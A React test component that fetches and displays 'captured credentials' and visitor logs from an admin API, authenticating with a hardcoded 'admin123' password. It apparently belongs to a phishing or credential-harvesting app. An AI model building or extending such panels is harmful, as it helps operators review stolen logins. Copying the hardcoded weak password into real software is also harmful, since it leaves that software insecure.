import React, { useState } from 'react';
import { adminAPI } from '../services/api';

const AdminTest = () => {
  const [result, setResult] = useState('Not tested yet');
  const [credentials, setCredentials] = useState([]);
  const [visitors, setVisitors] = useState([]);

  const testAPI = async () => {
    try {
      setResult('Testing...');
      
      const apiUrl = process.env.REACT_APP_API_URL || 'http://localhost:5001/api';
      setResult(`API URL: ${apiUrl}\n\nFetching data...`);
      
      const [credsRes, visitorsRes] = await Promise.all([
        adminAPI.getCapturedCredentials('admin123'),
        adminAPI.getVisitors('admin123')
      ]);
      
      setCredentials(credsRes.data.credentials || []);
      setVisitors(visitorsRes.data.visitors || []);
      setResult(`Success!\nCredentials: ${credsRes.data.credentials?.length || 0}\nVisitors: ${visitorsRes.data.visitors?.length || 0}`);
    } catch (error) {
      setResult(`Error: ${error.message}\n${JSON.stringify(error.response?.data || {}, null, 2)}`);
    }
  };

  return (
    <div style={{ padding: '20px', fontFamily: 'monospace' }}>
      <h1>Admin API Test</h1>
      <button onClick={testAPI} style={{ padding: '10px 20px', fontSize: '16px', cursor: 'pointer' }}>
        Test API
      </button>
      
      <pre style={{ background: '#f5f5f5', padding: '15px', marginTop: '20px', borderRadius: '5px' }}>
        {result}
      </pre>
      
      {credentials.length > 0 && (
        <div style={{ marginTop: '20px' }}>
          <h2>Captured Credentials ({credentials.length})</h2>
          <pre style={{ background: '#f0f8ff', padding: '15px', borderRadius: '5px', fontSize: '12px' }}>
            {JSON.stringify(credentials, null, 2)}
          </pre>
        </div>
      )}
      
      {visitors.length > 0 && (
        <div style={{ marginTop: '20px' }}>
          <h2>Visitors ({visitors.length})</h2>
          <pre style={{ background: '#fff8f0', padding: '15px', borderRadius: '5px', fontSize: '12px' }}>
            {JSON.stringify(visitors, null, 2)}
          </pre>
        </div>
      )}
    </div>
  );
};

export default AdminTest;
